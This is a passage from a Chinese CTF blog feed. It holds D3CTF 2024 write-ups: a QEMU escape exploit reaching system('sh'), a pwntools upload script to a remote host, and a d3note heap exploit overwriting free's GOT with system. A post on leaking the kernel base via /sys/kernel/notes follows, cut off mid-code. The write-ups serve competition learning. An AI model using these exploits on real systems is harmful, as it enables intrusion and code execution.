class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> port_mem = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>  <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> inl(port_mem + port); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    outl(val, port_mem + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">666</span>); <span class="comment">// dest = 666</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>, <span class="number">0x80</span>);  <span class="comment">// *(_DWORD *)(v8 + 0xA00) = 0x80</span></span><br><span class="line">    pmio_read(<span class="number">8</span>);  <span class="comment">// dword_123B1CC++</span></span><br><span class="line">    <span class="type">uint32_t</span> leak = mmio_read(<span class="number">0x8c</span>);</span><br><span class="line">    <span class="type">uint32_t</span> low_system_addr = <span class="number">0xa610</span> + leak;</span><br><span class="line">    hexx(<span class="string">&quot;low_system_addr&quot;</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0x94</span>, low_system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// addr_v7 = system(&quot;sh&quot;) % 0x100;</span></span><br><span class="line">    mmio_write(<span class="number">0x40</span>, <span class="number">0x6873</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;106.14.121.29&#x27;</span>, <span class="number">30537</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;# &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># send_cmd(&#x27;cd /proc/141/net&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可能用人会问，在 <code>qemu</code> 中执行 <code>system(&quot;/bin/sh&quot;)</code> 不是无法 <code>getsell</code> 的吗，执行后不会有任何回显。其实是可以 <code>getshell</code> 的，但是需要通过 <code>pwntools</code> 连接后才可以看见回显，其效果如下：  </p><img src="/2024/04/29/d3ctf2024/3.png" class="" title="我的图图呢">  <h1 id="d3note"><a href="#d3note" class="headerlink" title="d3note"></a>d3note</h1><p>题目代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sub_4011F2();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">6425</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = sub_4011F2();</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>));</span><br><span class="line">      *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v6 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">      *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v6) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">6425</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2064</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = sub_4011F2();</span><br><span class="line">      sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v7 + <span class="number">1</span>), *((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;unk_4040A0 + <span class="number">4</span> * v7));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">2064</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">276</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_4011F2();</span><br><span class="line">        v8 = sub_4011F2();</span><br><span class="line">        *((_DWORD *)&amp;unk_4040A0 + <span class="number">4</span> * v4) = v8;</span><br><span class="line">        *((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>((<span class="type">int</span>)v8);</span><br><span class="line">        sub_401186(*((_QWORD *)&amp;unk_4040A0 + <span class="number">2</span> * v4 + <span class="number">1</span>), v8);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 != <span class="number">1300</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        v5 = sub_4011F2();</span><br><span class="line">        <span class="built_in">puts</span>(*((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_4040A0 + <span class="number">2</span> * v5 + <span class="number">1</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启的保护：  </p><img src="/2024/04/29/d3ctf2024/4.png" class="" title="我的图图呢">  <p>这题第一眼看上去就感觉是经典的菜单题，但是看了办法没有发现堆上的漏洞，后面发现在输入堆块索引时程序并没有对输入的索引进行检测，导致可以使用负索引。由于没有开启 <code>PIE</code> 且 <code>RELRO</code> 状态为 <code>Partial RELRO</code>，所以我选择劫持 <code>free</code> 的 <code>got</code> 表为 <code>system</code> 然后释放掉一个内容为 <code>sh</code> 的堆块来实现 <code>getshell</code><br>这题的一个难点在于存储堆块指针的地址都是以 <code>8</code> 结尾，导致我们不好泄露地址，经过长时间的查找我找到了可以利用的地址  </p><img src="/2024/04/29/d3ctf2024/5.png" class="" title="我的图图呢">  <p>所以我选择以这里来泄露 <code>libc</code> 的地址并作为跳板来实现修改 <code>free</code> 的 <code>got</code> 表<br>exp：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;47.103.122.127&#x27;</span>,<span class="number">32244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;276&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;6425&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1300&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2064&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x10</span>,<span class="string">b&#x27;a\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">got = <span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">show(-<span class="number">1460</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">1918624</span></span><br><span class="line">log.success(<span class="string">f&#x27;libc_base:<span class="subst">&#123;libc_base:#x&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi = <span class="number">0x0000000000029419</span>+libc_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000fd76d</span>+libc_base</span><br><span class="line">ret = libc_base + <span class="number">0x00000000000275f2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x10</span>)+p64(got)</span><br><span class="line">edit(-<span class="number">1460</span>,payload+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(-<span class="number">2</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>去年的 <code>D3CTF</code> 是我第一次和校队组队参加比赛，当时我的 <code>pwn</code> 水平还停留在栈溢出阶段，完全的被这一些题目给震撼到了。今年再次参加 <code>D3CTF</code>，发现题目能看懂了，花点时间题目能做出来了，看来这一年的努力还是有那么一丢丢作用的，不过还是处于新手阶段，太弱了，哎。比赛期间真的太忙太多事情了，导致没有什么时间做题。<code>qemu</code> 逃逸找到漏洞后发现已经给 <code>xtx</code> 师傅做出来了呜呜呜（太强拉  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PwnShell&quot;&gt;&lt;a href=&quot;#PwnShell&quot; class=&quot;headerlink&quot; title=&quot;PwnShell&quot;&gt;&lt;/a&gt;PwnShell&lt;/h1&gt;&lt;h2 id=&quot;漏洞利用&quot;&gt;&lt;a href=&quot;#漏洞利用&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>When ELF notes reveal too much</title>
    <link href="https://qanux.github.io/2024/04/17/notes/"/>
    <id>https://qanux.github.io/2024/04/17/notes/</id>
    <published>2024-04-17T12:18:06.617Z</published>
    <updated>2024-04-17T12:22:11.735Z</updated>
    
    <content type="html"><![CDATA[<p>通常我们对内核的攻击都是基于知道内核各种地址的前提下进行的，为了加大攻击内核的难度， <code>kaslr</code> 由此而生，但内核会很容易泄露有关其位置的信息，如大量内核代码乐于在 <code>printk()</code> 调用中打印出内核指针值。<br>在 大量工作 之后，通过修复内核代码来使用针对指针的特殊格式化指令，并在未设置 <code>kptr_restrict</code> 的情况下拒绝将实际指针值输出到日志中，从而基本解决了这个问题。根据需要还修改了各种 <code>/proc</code> 和 <code>sysfs</code> 文件。随着时间的推移，要想了解特定系统上的内核位置就变得更加困难了，但依然有漏网之鱼可以为我们提供内核的基址<br>这里的主角是 <code>/sys/kernel/notes</code> ，在谷歌上找到的十分简略的描述：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">What:/sys/kernel/notes</span><br><span class="line">Date:July 2009</span><br><span class="line">Contact:&lt;linux-kernel@vger.kernel.org&gt;</span><br><span class="line">Description:The /sys/kernel/notes file contains the binary representation</span><br><span class="line">        of the running vmlinux&#x27;s .notes section.</span><br></pre></td></tr></table></figure><p>该部分是包含内核映像的 <code>ELF</code> 文件的一部分，包含有关映像本身的有用信息；任何内核代码都可以使用 <code>ELFNOTE()</code> 宏将数据添加到此部分。<br>接下来直接进入实践，环境来自一个 <code>ret2hbp</code> 的 <code>demo</code>  </p><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><p>启动内核后输入 <code>hexdump -C /sys/kernel/notes</code>  </p><img src="/2024/04/17/notes/1.png" class="" title="我的图图呢">  <p>可以看到这里确实有我们想要的内核地址，为了验证这个地址是否正确，我决定用这个地址来求解这一道题目<br>题目源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;linux/printk.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;veritas&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">vuln_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint64_t</span> addr;</span><br><span class="line">        <span class="type">uint64_t</span> val;</span><br><span class="line">    &#125; u;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;u, (<span class="type">void</span> *)arg, <span class="keyword">sizeof</span>(u))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write anything anywhere</span></span><br><span class="line">    <span class="comment">// pr_err(&quot;Arb Write [0x%016llx] = 0x%016llx\n&quot;, u.addr, u.val);</span></span><br><span class="line">    *(<span class="type">uint64_t</span> *)(u.addr) = u.val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">vuln_fops</span> =</span> &#123;.owner = THIS_MODULE,</span><br><span class="line">                                           .open = <span class="literal">NULL</span>,</span><br><span class="line">                                           .release = <span class="literal">NULL</span>,</span><br><span class="line">                                           .read = <span class="literal">NULL</span>,</span><br><span class="line">                                           .write = <span class="literal">NULL</span>,</span><br><span class="line">                                           .unlocked_ioctl = vuln_ioctl&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">vuln_miscdev</span> =</span> &#123;</span><br><span class="line">    .minor = 